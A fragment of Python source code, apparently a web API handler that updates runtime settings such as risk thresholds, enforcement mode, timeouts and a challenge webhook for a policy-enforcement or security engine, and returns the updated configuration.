            "opa_timeout_seconds",
            "fail_closed",
            "warm_threshold_calls",
            "risk_quarantine_threshold",
            "risk_block_threshold",
            "risk_flag_threshold",
            "scope_enforcement_mode",
            "challenge_timeout_seconds",
            "challenge_webhook_url",
            "challenge_webhook_format",
            "trifecta_override",
            "block_threshold",
        }
        updated = {}
        for k, v in payload.items():
            if k == "block_threshold":
                settings.risk_block_threshold = float(v)
                updated["risk_block_threshold"] = float(v)
                updated["block_threshold"] = float(v)
            elif k == "mode":
                val = str(v).lower()
                if val in ("enforce", "monitor", "audit"):
                    norm = "enforce" if val == "enforce" else "audit"
                    settings.mode = norm  # type: ignore[assignment]
                    updated["mode"] = norm
            elif k in editable_fields and hasattr(settings, k):
                setattr(settings, k, v)
                updated[k] = v
                if k == "scope_enforcement_mode":
                    engine.scope_analyzer.mode = v

        return {
            "status": "updated",
            "updated_fields": updated,
            "current_config": await soc_get_config(),
        }

    return router
